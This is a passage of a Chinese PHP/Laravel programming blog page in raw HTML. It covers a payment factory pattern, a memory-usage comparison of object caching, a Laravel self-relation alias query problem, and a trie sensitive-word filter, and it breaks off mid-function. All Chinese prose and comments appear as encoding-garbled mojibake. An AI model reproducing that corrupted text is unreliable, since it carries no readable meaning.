class="line"><span class="function"><span class="title">class</span> <span class="title">Alipay</span> <span class="title">implements</span> <span class="title">PaymentInterface</span> </span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">pay</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// æ”¯ä»˜å®æ”¯ä»˜å…·ä½“ä»£ç </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wechat</span> <span class="title">implements</span> <span class="title">PaymentInterface</span> </span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">pay</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// å¾®ä¿¡æ”¯ä»˜å…·ä½“ä»£ç </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">ç„¶åï¼Œåˆ›å»ºä¸€ä¸ªæ”¯ä»˜å·¥å‚ï¼Œæ­¤å·¥å‚ç”¨æ¥å®ä¾‹åŒ–å…·ä½“çš„æ”¯ä»˜ç±»</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PeymentFactory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params">$payType</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> ($payType) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'Alipay'</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Alipay();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'Wechat'</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Wechat();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">'æœªçŸ¥æ”¯ä»˜æ–¹å¼'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">æœ€åï¼Œåœ¨æ§åˆ¶å™¨ä¸­æ³¨å…¥æ­¤ Factory</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">pay</span> (<span class="params">Request $request, PaymentFactory $paymentFactory</span>) </span>&#123;</span><br><span class="line">    $payment = $paymentFactory-&gt;init($request-&gt;payType);</span><br><span class="line">    $payment-&gt;pay();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å†…å­˜å ç”¨é«˜ï¼Œé€Ÿåº¦å°±ä¼šæé«˜"><a href="#å†…å­˜å ç”¨é«˜ï¼Œé€Ÿåº¦å°±ä¼šæé«˜" class="headerlink" title="å†…å­˜å ç”¨é«˜ï¼Œé€Ÿåº¦å°±ä¼šæé«˜"></a>å†…å­˜å ç”¨é«˜ï¼Œé€Ÿåº¦å°±ä¼šæé«˜</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        echo <span class="string">'class a __construct'</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        echo <span class="string">'a1'</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        echo <span class="string">'a2'</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a3</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        echo <span class="string">'a3'</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//https://learnku.com/laravel/t/27033</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    protected $cache;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        echo <span class="string">'class b __construct'</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b1</span>(<span class="params">$tags=<span class="string">'tags'</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> a();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b2</span>(<span class="params">$tags=<span class="string">'tags'</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $cache=[];</span><br><span class="line">        <span class="keyword">if</span>(isset($cache[$tags])) <span class="keyword">return</span> $cache[$tags];</span><br><span class="line">        <span class="keyword">return</span> $cache[$tags]=<span class="keyword">new</span> a();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b3</span>(<span class="params">$tags=<span class="string">'tags'</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(isset($<span class="keyword">this</span>-&gt;cache[$tags])) <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;cache[$tags];</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;cache[$tags]=<span class="keyword">new</span> a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*å†…å­˜è®¡ç®—*/</span></span><br><span class="line">$start = memory_get_usage();</span><br><span class="line">$b=<span class="keyword">new</span> b();</span><br><span class="line">$b-&gt;b1()-&gt;a1();</span><br><span class="line">$b-&gt;b1()-&gt;a2();</span><br><span class="line">$b-&gt;b1()-&gt;a3();</span><br><span class="line"><span class="comment">/*å†…å­˜è®¡ç®—*/</span></span><br><span class="line">$end = memory_get_usage();</span><br><span class="line">echo ($end-$start).<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*å†…å­˜è®¡ç®—*/</span></span><br><span class="line">$start = memory_get_usage();</span><br><span class="line">$b=<span class="keyword">new</span> b();</span><br><span class="line">$b-&gt;b2()-&gt;a1();</span><br><span class="line">$b-&gt;b2()-&gt;a2();</span><br><span class="line">$b-&gt;b2()-&gt;a3();</span><br><span class="line"><span class="comment">/*å†…å­˜è®¡ç®—*/</span></span><br><span class="line">$end = memory_get_usage();</span><br><span class="line">echo ($end-$start).<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*å†…å­˜è®¡ç®—*/</span></span><br><span class="line">$start = memory_get_usage();</span><br><span class="line">$b=<span class="keyword">new</span> b();</span><br><span class="line">$b-&gt;b3()-&gt;a1();</span><br><span class="line">$b-&gt;b3()-&gt;a2();</span><br><span class="line">$b-&gt;b3()-&gt;a3();</span><br><span class="line"><span class="comment">/*å†…å­˜è®¡ç®—*/</span></span><br><span class="line">$end = memory_get_usage();</span><br><span class="line">echo ($end-$start).<span class="string">"\n"</span>;</span><br><span class="line">å†…å­˜å ç”¨é«˜ï¼Œé€Ÿåº¦å°±ä¼šæé«˜ï¼Œåä¹‹ï¼Œå°±é€Ÿåº¦å°±ä¼šé™ä½ï¼Œä¸Šé¢é‚£ä¸ª b1 å’Œ b2 åé¢åº”è¯¥åŠ ä¸€ä¸ª unset ($b), å†…å­˜è®¡ç®—æ‰å‡†ç¡®å§</span><br><span class="line">è¿™åº”è¯¥å°±æ˜¯è¿æ¥æ•°æ®åº“çš„æ—¶å€™ä¸ºä»€ä¹ˆæ¨èä½¿ç”¨çŸ­é“¾æ¥è€Œä¸æ˜¯é•¿é“¾æ¥çš„åŸå› å§ï¼Œé•¿è¿æ¥å ç”¨å†…å­˜é«˜ï¼Œèµ„æºå¤šå§ï¼Œä¸å³æ—¶é‡Šæ”¾</span><br><span class="line"></span><br><span class="line">è°ƒç”¨ç¬¬äºŒä¸ª b1 çš„æ—¶å€™ï¼Œç¬¬ä¸€ä¸ª b1 åˆ›å»ºå‡ºæ¥çš„ a å°±è¢«é”€æ¯äº†å•Šï¼Œå°±ä¸å å†…å­˜äº†å•Šã€‚</span><br><span class="line">è¿™é¢˜è¿˜æœ‰ä¸€ä¸ªç›®çš„ï¼Œåœ¨åŒä¸€ä¸ªè¿›ç¨‹ä¸‹æƒ³å‡å°‘ <span class="keyword">new</span> çš„æ¬¡æ•°ï¼Œç»“æœç”»è›‡æ·»è¶³äº†</span><br></pre></td></tr></table></figure>
<h3 id="å…³è”æ¨¡å‹å­—æ®µå–åˆ«åæŸ¥è¯¢ä¸å‡ºæ•°æ®"><a href="#å…³è”æ¨¡å‹å­—æ®µå–åˆ«åæŸ¥è¯¢ä¸å‡ºæ•°æ®" class="headerlink" title="å…³è”æ¨¡å‹å­—æ®µå–åˆ«åæŸ¥è¯¢ä¸å‡ºæ•°æ®"></a>å…³è”æ¨¡å‹å­—æ®µå–åˆ«åæŸ¥è¯¢ä¸å‡ºæ•°æ®</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/articles/22489#topnav</span></span><br><span class="line">laravel è‡ªå¸¦çš„ ORM æ˜¯ä¸ªç¥å™¨ï¼Œé’ˆå¯¹è¿™ç§æœ‰å…³ç³»çš„æ•°æ®ï¼Œå®Œå…¨å¯ä»¥ä½¿ç”¨å…³ç³»æ¨¡å‹ï¼Œæ—¢ç®€å•åˆå®ç”¨ï¼Œç”±äºè¿™é‡Œåªæœ‰ä¸€ä¸ªæ•°æ®è¡¨ï¼Œå…³ç³»ä¹Ÿå­˜åœ¨äºåŒä¸€å¼ è¡¨ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨è‡ªå…³è”ï¼Œå°†ä¸¤ä¸ªå…³ç³»å®šä¹‰åœ¨åŒä¸€ä¸ª Model é‡Œé¢ï¼š</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">parent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;hasOne($<span class="keyword">this</span>, <span class="string">'id'</span>, <span class="string">'parent_id'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">children</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;hasMany($<span class="keyword">this</span>, <span class="string">'parent_id'</span>, <span class="string">'id'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">å…³ç³»å®šä¹‰é‡Œé¢çš„å‚æ•°ä¹Ÿå¯ä»¥è¿™æ ·å†™ï¼š</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">parent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;hasOne(get_class($<span class="keyword">this</span>), $<span class="keyword">this</span>-&gt;getKeyName(), <span class="string">'parent_id'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">children</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;hasMany(get_class($<span class="keyword">this</span>), <span class="string">'parent_id'</span>, $<span class="keyword">this</span>-&gt;getKeyName());</span><br><span class="line">    &#125;</span><br><span class="line">æŸ¥è¯¢åŒ…å«å­èœå•çš„æ•°æ®</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Admin_menu::<span class="keyword">with</span>([<span class="string">'children'</span> =&gt; <span class="function"><span class="keyword">function</span>(<span class="params">$query</span>)</span>&#123;</span><br><span class="line">                $query-&gt;select(<span class="string">'id'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>);</span><br><span class="line">            &#125;])</span><br><span class="line">            -&gt;select(<span class="string">'id'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>)</span><br><span class="line">            -&gt;get();</span><br><span class="line">where <span class="keyword">in</span> ï¼ˆarrayï¼‰è¿™é‡Œçš„ array æ˜¯ä¾èµ–ä¸»é”®çš„åç§°çš„ï¼Œåœ¨å…³è”æŸ¥è¯¢çš„æ—¶å€™ï¼Œå·²ç»å®šä¹‰äº† id = [<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6.</span>..]ï¼Œä½†æ˜¯æˆ‘ä»¬æœ€åç»™ id å–äº†åˆ«åï¼Œå˜æˆ MaindIdï¼Œæ‰€ä»¥æ‰¾ä¸åˆ°åä¸º id çš„æ•°ç»„ã€‚</span><br><span class="line">å¦‚æœçœŸæ˜¯è¿™æ ·ï¼Œæˆ‘ä»¬è¯•ç€å†ç»™å®ƒåŠ ä¸Š idï¼Œè®©å®ƒèƒ½å¤Ÿæ‰¾åˆ°åä¸º id çš„æ•°ç»„</span><br><span class="line">    \DB::connection()-&gt;enableQueryLog(); <span class="comment">// å¼€å¯æŸ¥è¯¢æ—¥å¿—</span></span><br><span class="line">    $menus =  Admin_menu::<span class="keyword">with</span>([<span class="string">'children'</span> =&gt; <span class="function"><span class="keyword">function</span>(<span class="params">$query</span>)</span>&#123;</span><br><span class="line">        $query-&gt;select(<span class="string">'id'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>);</span><br><span class="line">    &#125;])</span><br><span class="line">    -&gt;select(<span class="string">'id'</span>, <span class="string">'id as MainId'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>)</span><br><span class="line">    -&gt;get();</span><br><span class="line">    foreach (\DB::getQueryLog() <span class="keyword">as</span> $sql) &#123;</span><br><span class="line">        dump($sql[<span class="string">'query'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    ä¾èµ–å…³è”ä¸»é”® localKey çš„æŸ¥è¯¢ï¼Œä¸èƒ½ç¼ºå°‘ç›¸åº”çš„å­—æ®µï¼Œä¹Ÿå°±æ˜¯è¯´ select åº”è¯¥åŒ…å«å¯¹åº” localKeyï¼Œå¦‚æœè¦å–åˆ«ååº”è¯¥é¢å¤–æ·»åŠ ï¼Œå½¢å¦‚ï¼š</span><br><span class="line">    </span><br><span class="line">    select(<span class="string">'id'</span>, <span class="string">'id as MainId'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>, <span class="string">'parent_id as extraId'</span>)</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $menus = Admin_menu::<span class="keyword">with</span>([<span class="string">'parent'</span> =&gt; <span class="function"><span class="keyword">function</span>(<span class="params">$query</span>)</span>&#123;</span><br><span class="line">                $query-&gt;select(<span class="string">'id'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>);</span><br><span class="line">            &#125;])</span><br><span class="line">            -&gt;select(<span class="string">'id'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>)</span><br><span class="line">            -&gt;get();</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;transformer($menus);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">transformer</span>(<span class="params">$items</span>) </span>&#123;</span><br><span class="line">        $data = [];</span><br><span class="line">        foreach ($items ?? [] <span class="keyword">as</span> $item) &#123;</span><br><span class="line">            $data[] = [</span><br><span class="line">                <span class="string">'mainId'</span> =&gt; $item-&gt;id,</span><br><span class="line">                <span class="string">'title'</span> =&gt; $item-&gt;title,</span><br><span class="line">                <span class="string">'parent_id'</span> =&gt; $item-&gt;parent_id,</span><br><span class="line">                <span class="string">'children'</span> =&gt; $item-&gt;children,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ•æ„Ÿè¯è¿‡æ»¤ç®—æ³•"><a href="#æ•æ„Ÿè¯è¿‡æ»¤ç®—æ³•" class="headerlink" title="æ•æ„Ÿè¯è¿‡æ»¤ç®—æ³•"></a>æ•æ„Ÿè¯è¿‡æ»¤ç®—æ³•</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line">https:<span class="comment">//juejin.im/post/5cb56372f265da037d4fa133</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeMap</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public $data;  <span class="comment">// èŠ‚ç‚¹å­—ç¬¦</span></span><br><span class="line">    public $children = [];  <span class="comment">// å­˜æ”¾å­èŠ‚ç‚¹å¼•ç”¨ï¼ˆå› ä¸ºæœ‰ä»»æ„ä¸ªå­èŠ‚ç‚¹ï¼Œæ‰€ä»¥é æ•°ç»„æ¥å­˜å‚¨ï¼‰</span></span><br><span class="line">    public $isEndingChar = <span class="literal">false</span>;  <span class="comment">// æ˜¯å¦æ˜¯å­—ç¬¦ä¸²ç»“æŸå­—ç¬¦</span></span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;data = $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TrieTree</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ•æ„Ÿè¯æ•°ç»„</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @var array</span></span><br><span class="line"><span class="comment">     * @author qpf</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public $trieTreeMap = array();</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;trieTreeMap = <span class="keyword">new</span> TreeMap(<span class="string">'/'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è·å–æ•æ„Ÿè¯Map</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @return array</span></span><br><span class="line"><span class="comment">     * @author qpf</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getTreeMap</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;trieTreeMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ·»åŠ æ•æ„Ÿè¯</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param array $txtWords</span></span><br><span class="line"><span class="comment">     * @author qpf</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">addWords</span>(<span class="params">array $wordsList</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        foreach ($wordsList <span class="keyword">as</span> $words) &#123;</span><br><span class="line">            $trieTreeMap = $<span class="keyword">this</span>-&gt;trieTreeMap;</span><br><span class="line">            $len = mb_strlen($words);</span><br><span class="line">            <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">                $word = mb_substr($words, $i, <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span>(!isset($trieTreeMap-&gt;children[$word]))&#123;</span><br><span class="line">                    $newNode = <span class="keyword">new</span> TreeMap($word);</span><br><span class="line">                    $trieTreeMap-&gt;children[$word] = $newNode;</span><br><span class="line">                &#125;</span><br><span class="line">                $trieTreeMap = $trieTreeMap-&gt;children[$word];</span><br><span class="line">            &#125;</span><br><span class="line">            $trieTreeMap-&gt;isEndingChar = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æŸ¥æ‰¾å¯¹åº”æ•æ„Ÿè¯</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param string $txt</span></span><br><span class="line"><span class="comment">     * @return array</span></span><br><span class="line"><span class="comment">     * @author qpf</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params">$txt</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $wordsList = array();</span><br><span class="line">        $txtLength = mb_strlen($txt);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $txtLength; $i++) &#123;</span><br><span class="line">            $wordLength = $<span class="keyword">this</span>-&gt;checkWord($txt, $i, $txtLength);</span><br><span class="line">            <span class="keyword">if</span>($wordLength &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                echo $wordLength;</span><br><span class="line">                $words = mb_substr($txt, $i, $wordLength);</span><br><span class="line">                $wordsList[] = $words;</span><br><span class="line">                $i += $wordLength - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $wordsList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ•æ„Ÿè¯æ£€æµ‹</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param $txt</span></span><br><span class="line"><span class="comment">     * @param $beginIndex</span></span><br><span class="line"><span class="comment">     * @param $length</span></span><br><span class="line"><span class="comment">     * @return int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">checkWord</span>(<span class="params">$txt, $beginIndex, $length</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $flag = <span class="literal">false</span>;</span><br><span class="line">        $wordLength = <span class="number">0</span>;</span><br><span class="line">        $trieTree = $<span class="keyword">this</span>-&gt;trieTreeMap; <span class="comment">//è·å–æ•æ„Ÿè¯æ ‘</span></span><br><span class="line">        <span class="keyword">for</span> ($i = $beginIndex; $i &lt; $length; $i++) &#123;</span><br><span class="line">            $word = mb_substr($txt, $i, <span class="number">1</span>); <span class="comment">//æ£€éªŒå•ä¸ªå­—</span></span><br><span class="line">            <span class="keyword">if</span> (!isset($trieTree-&gt;children[$word])) &#123; <span class="comment">//å¦‚æœæ ‘ä¸­ä¸å­˜åœ¨ï¼Œç»“æŸ        </span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//å¦‚æœå­˜åœ¨</span></span><br><span class="line">            $wordLength++; </span><br><span class="line">            $trieTree = $trieTree-&gt;children[$word];</span><br><span class="line">            <span class="keyword">if</span> ($trieTree-&gt;isEndingChar === <span class="literal">true</span>) &#123;  </span><br><span class="line">                $flag = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($beginIndex &gt; 